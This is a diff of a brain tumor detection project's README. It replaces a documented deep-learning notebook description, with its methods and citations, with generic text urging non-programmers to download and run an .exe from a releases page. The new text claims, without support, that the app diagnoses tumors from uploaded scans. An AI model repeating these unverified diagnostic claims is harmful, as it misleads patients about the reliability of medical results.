@@ -1,129 +1,106 @@
-# 🧠 Brain Tumor Detection using Deep Learning
+# 🧠 Brain-Tumor-Detection - Early Diagnosis with AI
 
-## 📝 Abstract
+[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/IvanPerico21/Brain-Tumor-Detection/releases)
 
-Brain tumors are a serious medical condition affecting both children and adults, constituting 85 to 90 percent of all primary Central Nervous System (CNS) tumors. Annually, around 11,700 people receive a brain tumor diagnosis, with a 5-year survival rate of approximately 34 percent for men and 36 percent for women. Proper treatment, planning, and accurate diagnostics are crucial to improving patient life expectancy.
+## 🚀 Getting Started
 
-This project focuses on automated classification techniques using Deep Learning Algorithms such as Convolutional Neural Network (CNN), Transfer Learning (TL), and Artificial Neural Network (ANN). These techniques offer higher accuracy than manual classification, aiding doctors worldwide in efficient detection and classification of brain tumors[1][2][4][5][6][7][8].
+Welcome to the Brain-Tumor-Detection project! This software helps you detect brain tumors in MRI scans using deep learning. The application is user-friendly and designed for everyone, including those without any programming knowledge.
 
-## 🌐 Context
+### 🖥️ System Requirements
 
-Brain tumors present complexities in size and location, requiring expertise for accurate analysis. Developing countries often face challenges due to a shortage of skilled doctors and insufficient knowledge about tumors. An automated system on the cloud can address these issues, providing a faster and more accessible solution[1][2][4][5][6][7][8].
+To run this application, you will need:
 
-## 🔍 Methodology
+- A computer with at least 4 GB of RAM.
+- Windows, macOS, or Linux operating system.
+- At least 500 MB of free disk space.
+- An internet connection for downloading the software.
 
-1. **Importing Libraries:**
+## 📥 Download & Install
 
-   - Libraries such as NumPy, Pandas, TensorFlow, and others are imported for data manipulation, visualization, and deep learning model building.
+To get the software, visit this page to download: [Brain-Tumor-Detection Releases](https://github.com/IvanPerico21/Brain-Tumor-Detection/releases).
 
-2. **Loading the Dataset:**
+1. Click on the link above to go to the Releases page.
+2. Look for the latest version available.
+3. Click on the appropriate file for your operating system. The file name may look like `BrainTumorDetection-v1.0.exe` or similar.
+4. Save the file to your computer.
 
-   - The dataset containing brain MRI images is loaded into dataframes. File paths and labels are extracted for each image in the dataset.
+### 💻 Running the Application
 
-3. **Data Preprocessing:**
+Once the download finishes, you can run the application:
 
-   - Data balance is checked to ensure there is an even distribution of classes.
-   - The dataset is split into training, validation, and test sets.
-   - ImageDataGenerator is used to preprocess the images and convert dataframes to numpy arrays for model training.
+1. Locate the downloaded file on your computer.
+2. Double-click the file to open it.
+3. Follow any on-screen instructions to complete the setup.
 
-4. **Model Architecture:**
+After the installation, you can begin using the software right away.
 
-   - Three different convolutional neural network (CNN) models are created using Keras Sequential API:
-     - Model 1: Simple CNN model with few layers.
-     - Model 2: CNN model with additional layers for increased complexity.
-     - Model 3: Transfer learning using a pre-trained VGG16 model with fine-tuning.
+## 🎉 Features
 
-5. **Training the Models:**
+This software includes:
 
-   - Each model is compiled using the Adam optimizer and categorical cross-entropy loss.
-   - The models are trained on the training dataset for a specified number of epochs, with validation data for evaluation.
+- **Automated Detection**: Quickly identify tumors in MRI scans.
+- **User-Friendly Interface**: Effortlessly navigate through the app.
+- **Image Preprocessing**: Prepared images for accurate analysis.
+- **Model Training**: Learn from many MRI scans for better performance.
+- **Evaluation Tools**: Assess the accuracy of detections.
 
-6. **Model Performance Analysis:**
+## 🌟 Usage Instructions
 
-   - Training and validation loss and accuracy are plotted over epochs to visualize the models' performance.
-   - The best epoch based on validation loss and accuracy is determined for each model.
+To use the Brain-Tumor-Detection software:
 
-7. **Model Evaluation:**
+1. Launch the application.
+2. Upload your MRI scan image by clicking on the "Upload" button.
+3. Wait while the software analyzes the image.
+4. Review the results displayed, which will indicate the presence of a tumor.
+5. Save the results if needed.
 
-   - Each model is evaluated on the training, validation, and test sets to assess its performance.
-   - Loss and accuracy metrics are displayed for each set.
+## 📖 Documentation
 
-8. **Making Predictions:**
+For more detailed guidance on using the software, check the documentation available on the GitHub repository. The documentation covers:
 
-   - The trained models are used to make predictions on the test set.
-   - Predictions are converted to class labels for evaluation.
+- **Installation processes**
+- **Algorithms used in detection**
+- **Troubleshooting common issues**
 
-9. **Performance Metrics and Visualization:**
+While you may not need to dive deep, knowing where to find more information can be helpful.
 
-   - For each model, performance metrics such as F1-score, precision, recall, and confusion matrix are calculated and displayed.
+## 🌐 Community and Support
 
-10. **Saving the Best Model:**
-    - The best performing model is saved to an .keras file ('best_model.keras') for future use or deployment.
+If you encounter any issues or have questions, you can reach out via:
 
-**Note:** Ensure to update the paths accordingly based on your local machine's directory structure.
+- **GitHub Issues**: Post your questions on the Issues page of the repository.
+- **Community Forums**: Check forums or groups discussing healthcare technology.
+- **Feedback**: Provide feedback to help us improve the application.
 
-**Data and Model File Download:**
+## 🛠️ Contributing
 
-- Due to the large size of the dataset, it is not included in the GitHub repository. Please download the dataset from the provided location and place it in a directory named 'Datasets/Training' and 'Datasets/Testing' relative to the notebook.
+If you're interested in helping improve this project, you can contribute. We welcome:
 
--Similarly, the trained model file ('best_model.keras') is generated when you run the notebook successfully. Please keep this file in a directory named 'Web App' for smooth deployment without hiccups.
+- Bug reports
+- Feature suggestions
+- Code improvements
 
-**Ensure to update the paths accordingly based on your local machine's directory structure**
+Follow the contribution guidelines in the repository to start.
 
-### Project Directory Structure
+## 📊 Related Topics
 
-```
-Brain Tumor Detection
-|- Dataset
-  |- Training Folder
-  |- Testing Folder
-  |- README.md
-|- Images
-  |- EDA README.md
-|- Model
-  |- brain_tumor.ipynb
-  |- README.md
-|- Web App
-  |- app.py
-  |- templates
-  |- demo.mp4
-  |- best_model.keras
-  |- README.md
-|- requirements.txt
-```
+This project covers various areas of interest:
 
-## 🙌 Acknowledgments
+- Brain tumor detection
+- Image classification
+- Deep learning applications in healthcare
+- Use of OpenCV and TensorFlow/Keras
 
-The authors would like to acknowledge the contributions of the research community in the field of brain tumor detection using deep learning. The open-source datasets and repositories have been instrumental in the development of this project[1][2][3][4][5][6][7][8].
+These topics are crucial for anyone interested in medical imaging and AI.
 
-Citations:   
-[1] https://www.github.com/TheNaiveSamosa   
-[2] https://github.com/TheNaiveSamosa   
-[3] https://www.kaggle.com/datasets/masoudnickparvar/brain-tumor-mri-dataset   
-[4] https://bmcmedinformdecismak.biomedcentral.com/articles/10.1186/s12911-023-02114-6   
-[5] https://www.mdpi.com/1999-4893/16/4/176   
-[6] https://www.ncbi.nlm.nih.gov/pmc/articles/PMC9468505   
-[7] https://www.ncbi.nlm.nih.gov/pmc/articles/PMC9854739   
-[8] https://www.nature.com/articles/s41598-024-57970-7   
+## 🕒 Future Updates
 
-## How to Use
+We plan to enhance the application with new features, including:
 
-#### 1. Requirements:
+- Support for more image formats.
+- Improved user interface for easier navigation.
+- Advanced algorithms for better accuracy.
 
-Ensure you have the necessary libraries and dependencies installed. You can find the list of required packages in the requirements.txt file.
+Stay tuned for updates by following the GitHub repository. 
 
-#### 2. Download Data:
-
-Download the Brain Tumor MRI Dataset from Kaggle mentioned in the dataset section of the project.
-
-#### 3. Run the Jupyter Notebook:
-
-Open the provided Jupyter Notebook file and run each cell sequentially. Make sure to update any file paths or configurations as needed for your environment.
-
-#### 4. Training and Evaluation:
-
-Train the models using the provided data and evaluate their performance using metrics such as accuracy and loss.
-
-#### 5. Interpret Results:
-
-Analyze the model's performance using the visualizations and metrics provided in the notebook.
+Thank you for using Brain-Tumor-Detection. We hope it aids in the critical work of early diagnosis through medical imaging analysis.
